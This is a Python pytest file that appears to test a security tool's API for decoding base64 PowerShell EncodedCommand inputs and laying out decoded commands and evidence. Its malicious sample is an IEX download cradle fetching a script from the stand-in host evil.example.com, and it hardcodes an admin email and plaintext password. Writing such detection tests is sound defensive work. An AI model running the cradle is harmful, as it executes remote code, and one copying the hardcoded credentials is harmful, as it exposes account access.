"""
PR-2.1.2 · Canonical Artifact Contract · API-level regression tests
==================================================================
Independent tests (do NOT re-run prior suite). Hits `/api/decode/smart`
with the exact benign PS EncodedCommand input the user reported, plus a
malicious counterpart, and asserts the ARB Rule 12/13/14 invariants:

  1. Response `output` contains
        `Reconstructed Command (canonical · post-decode):`
     followed by the DECODED PowerShell (e.g. `Write-Host`).
  2. Response `output` contains
        `Wrapper Evidence (retained for context · T1027.010):`
     followed by the base64 wrapper (`powershell -EncodedCommand <b64>`).
  3. The base64 wrapper string does NOT appear on the line immediately
     after the FIRST `Reconstructed Command` label. (Regression guard
     against the old behaviour where the wrapper leaked into the
     canonical slot.)
  4. Evidence-backed Behavior list — `Mixed-case obfuscation` and
     `Comma-separated token obfuscation` must NOT appear for an input
     that has neither.
  5. Runtime Output (Simulation) still emits the expected literal for
     the benign payload.
  6. Decode/Auto Investigate equivalence — the canonical Reconstructed
     Command line is present in the `/api/v2/auto-investigate` output
     for the same input.
  7. L0 damage-prevention — DCS strict 17/17 and R1 strict 107/107
     remain byte-identical to their goldens.
"""
from __future__ import annotations

import base64
import os
import re
from pathlib import Path

import pytest
import requests

BASE_URL = os.environ["REACT_APP_BACKEND_URL"].rstrip("/")
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASS  = "uulVDp5cCSB3Hva99s7UUAwK"

BENIGN_PS_SCRIPT = 'Write-Host "This comes from an encoded PS command!"'
BENIGN_B64 = base64.b64encode(BENIGN_PS_SCRIPT.encode("utf-16-le")).decode()
BENIGN_INPUT = f"powershell -EncodedCommand {BENIGN_B64}"

MAL_PS_SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.example.com/x.ps1")'
MAL_B64 = base64.b64encode(MAL_PS_SCRIPT.encode("utf-16-le")).decode()
MAL_INPUT = f"powershell.exe -EncodedCommand {MAL_B64}"


# ---------------------------------------------------------------------------
# Auth fixture
# ---------------------------------------------------------------------------
@pytest.fixture(scope="session")
def token() -> str:
    r = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={"email": ADMIN_EMAIL, "password": ADMIN_PASS},
        timeout=90,
    )
    if r.status_code != 200:
        pytest.skip(f"Login failed: {r.status_code} · {r.text[:200]}")
    return r.json()["access_token"]


@pytest.fixture(scope="session")
def auth_headers(token: str) -> dict:
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


# ---------------------------------------------------------------------------
# Helper — call /api/decode/smart and return response JSON
# ---------------------------------------------------------------------------
def _decode_smart(text: str, headers: dict) -> dict:
    r = requests.post(
        f"{BASE_URL}/api/decode/smart",
        headers=headers,
        json={"input": text, "mode": "strict", "analysis_mode": "balanced"},
        timeout=120,
    )
    assert r.status_code == 200, f"decode/smart status={r.status_code} body={r.text[:400]}"
    return r.json()


def _extract_norm_block(output: str) -> str:
    """Return the ▼ POWERSHELL NORMALIZATION block from the merged output."""
    m = re.search(
        r"▼ POWERSHELL NORMALIZATION.*?(?=\n▼|\Z)",
        output,
        re.DOTALL,
    )
    assert m, f"PS normalization block missing.\nFULL OUTPUT:\n{output[:2000]}"
    return m.group(0)


# ---------------------------------------------------------------------------
# 1) Canonical Reconstructed Command shows DECODED payload
# ---------------------------------------------------------------------------
class TestBenignCanonicalArtifact:
    @pytest.fixture(scope="class")
    def resp(self, auth_headers):
        return _decode_smart(BENIGN_INPUT, auth_headers)

    def test_response_shape(self, resp):
        assert "output" in resp
        assert isinstance(resp["output"], str) and len(resp["output"]) > 0

    def test_canonical_reconstructed_label_present(self, resp):
        block = _extract_norm_block(resp["output"])
        assert "Reconstructed Command (canonical · post-decode):" in block, (
            f"Canonical label missing.\nBLOCK:\n{block}"
        )

    def test_canonical_line_contains_decoded_script(self, resp):
        block = _extract_norm_block(resp["output"])
        # The line after the canonical label must contain the decoded payload
        m = re.search(
            r"Reconstructed Command \(canonical · post-decode\):\s*\n\s*(.+)",
            block,
        )
        assert m, f"Cannot locate canonical line in block:\n{block}"
        canonical_line = m.group(1).strip()
        assert "Write-Host" in canonical_line, (
            f"Canonical line does NOT contain 'Write-Host'. Got: {canonical_line!r}"
        )
        assert BENIGN_B64 not in canonical_line, (
            "REGRESSION: base64 wrapper leaked onto canonical Reconstructed line."
        )

    def test_wrapper_evidence_present_with_b64(self, resp):
        block = _extract_norm_block(resp["output"])
        assert "Wrapper Evidence (retained for context · T1027.010):" in block, (
            "Wrapper Evidence label missing."
        )
        # b64 must appear only in the Wrapper Evidence section (after that label)
        wrap_idx = block.index("Wrapper Evidence")
        assert BENIGN_B64 in block[wrap_idx:], (
            "Base64 wrapper absent from Wrapper Evidence section."
        )
        # And it must NOT appear anywhere before that label
        assert BENIGN_B64 not in block[:wrap_idx], (
            "REGRESSION: base64 wrapper appears BEFORE Wrapper Evidence label — "
            "should only exist in the evidence section."
        )

    def test_wrapper_not_on_first_reconstructed_line(self, resp):
        """Explicit ARB check: line immediately after FIRST 'Reconstructed
        Command' label must not be the b64 wrapper."""
        block = _extract_norm_block(resp["output"])
        m = re.search(r"Reconstructed Command[^\n]*:\s*\n\s*(.+)", block)
        assert m, "No 'Reconstructed Command' label found at all."
        first_line = m.group(1).strip()
        assert BENIGN_B64 not in first_line, (
            f"REGRESSION: base64 on first Reconstructed line: {first_line!r}"
        )
        assert "-EncodedCommand" not in first_line, (
            f"REGRESSION: -EncodedCommand wrapper on first Reconstructed line: {first_line!r}"
        )

    def test_runtime_simulation_shows_decoded_output(self, resp):
        block = _extract_norm_block(resp["output"])
        assert "Runtime Output (Simulation" in block
        assert "This comes from an encoded PS command!" in block, (
            "Runtime Output simulation missing the expected literal."
        )

    def test_behavior_list_evidence_backed(self, resp):
        block = _extract_norm_block(resp["output"])
        # Neither obfuscation applies to this input — must be absent.
        assert "Mixed-case obfuscation" not in block, (
            "Mixed-case obfuscation claimed without evidence."
        )
        assert "Comma-separated token obfuscation" not in block, (
            "Comma-separated token obfuscation claimed without evidence."
        )
        # T1027.010 label SHOULD appear because we did decode a wrapper.
        assert "T1027.010" in block

    def test_verdict_partial(self, resp):
        vc = resp.get("verdict_card") or {}
        assert vc.get("verdict") == "Partial", (
            f"Expected verdict 'Partial', got {vc.get('verdict')!r}. "
            f"verdict_card={vc}"
        )
        # risk projection "Partial · 25"
        risk = vc.get("risk") or vc.get("risk_projection") or ""
        assert "Partial" in str(risk) and "25" in str(risk), (
            f"Expected risk projection 'Partial · 25'; got {risk!r}"
        )


# ---------------------------------------------------------------------------
# 2) Malicious payload — same canonical/wrapper structure applies
# ---------------------------------------------------------------------------
class TestMaliciousCanonicalArtifact:
    @pytest.fixture(scope="class")
    def resp(self, auth_headers):
        return _decode_smart(MAL_INPUT, auth_headers)

    def test_canonical_line_contains_decoded_script(self, resp):
        block = _extract_norm_block(resp["output"])
        assert "Reconstructed Command (canonical · post-decode):" in block
        m = re.search(
            r"Reconstructed Command \(canonical · post-decode\):\s*\n\s*(.+)",
            block,
        )
        assert m, block
        canonical_line = m.group(1).strip()
        # Decoded payload markers
        assert "DownloadString" in canonical_line or "Net.WebClient" in canonical_line, (
            f"Canonical line missing decoded IOC markers: {canonical_line!r}"
        )
        assert MAL_B64 not in canonical_line

    def test_wrapper_evidence_section_holds_wrapper(self, resp):
        block = _extract_norm_block(resp["output"])
        assert "Wrapper Evidence (retained for context · T1027.010):" in block
        wrap_idx = block.index("Wrapper Evidence")
        after_wrap = block[wrap_idx:]
        assert MAL_B64 in after_wrap
        assert "-EncodedCommand" in after_wrap


# ---------------------------------------------------------------------------
# 3) Decode / Auto-Investigate equivalence (Rule 14)
# ---------------------------------------------------------------------------
class TestDecodeAutoInvestigateEquivalence:
    def test_both_surfaces_carry_canonical_line(self, auth_headers):
        # /api/decode/smart
        smart = _decode_smart(BENIGN_INPUT, auth_headers)
        smart_block = _extract_norm_block(smart["output"])
        assert "Reconstructed Command (canonical · post-decode):" in smart_block

        # /api/v2/auto-investigate
        r = requests.post(
            f"{BASE_URL}/api/v2/auto-investigate",
            headers=auth_headers,
            json={"incident_text": BENIGN_INPUT},
            timeout=180,
        )
        assert r.status_code == 200, r.text[:400]
        ai = r.json()
        # Serialise the whole response and check the canonical label is
        # present somewhere in the Auto Investigate rendering.
        import json as _json
        ai_dump = _json.dumps(ai)
        assert "Reconstructed Command (canonical · post-decode)" in ai_dump, (
            "Auto Investigate surface missing the canonical Reconstructed line."
        )
        # And the decoded script text must be in the AI dump too.
        assert "Write-Host" in ai_dump


# ---------------------------------------------------------------------------
# 4) L0 damage-prevention — DCS 17/17, R1 107/107 byte-identical goldens
# ---------------------------------------------------------------------------
class TestL0DamagePrevention:
    """Runs the strict goldens for DCS and R1 corpora if the runners are
    available under /app/backend/tests. Marks xfail-lite if the runner
    scripts are missing so we don't pollute the report for out-of-scope
    infra."""

    def _run_and_count(self, cmd: list[str]) -> str:
        import subprocess
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=600,
                           cwd="/app/backend")
        return (p.stdout or "") + (p.stderr or "")

    def test_dcs_strict_17_of_17(self):
        script = Path("/app/backend/tests/corpus/dcs_strict_runner.py")
        if not script.exists():
            pytest.skip(f"DCS strict runner not present at {script}")
        out = self._run_and_count(["python", str(script)])
        assert "17/17" in out, f"DCS strict not 17/17. Tail:\n{out[-800:]}"

    def test_r1_strict_107_of_107(self):
        script = Path("/app/backend/tests/corpus/r1_strict_runner.py")
        if not script.exists():
            pytest.skip(f"R1 strict runner not present at {script}")
        out = self._run_and_count(["python", str(script)])
        assert "107/107" in out, f"R1 strict not 107/107. Tail:\n{out[-800:]}"
